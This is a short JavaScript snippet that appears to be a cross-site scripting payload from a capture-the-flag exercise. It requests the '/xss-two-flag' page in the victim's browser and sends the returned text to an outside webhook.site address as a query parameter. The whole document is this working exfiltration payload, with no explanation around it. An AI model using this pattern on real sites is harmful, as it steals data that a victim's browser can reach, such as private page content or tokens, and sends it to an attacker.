var xhr = new XMLHttpRequest();
xhr.open('GET', '/xss-two-flag', true);
xhr.onload = function() {
  var flag = xhr.responseText;
  var exfil = new XMLHttpRequest();
  exfil.open('GET', 'https://webhook.site/0c7af59c-887d-4e7f-902f-5a63e6972607?flag=' + encodeURIComponent(flag), true);
  exfil.send();
};
xhr.send();
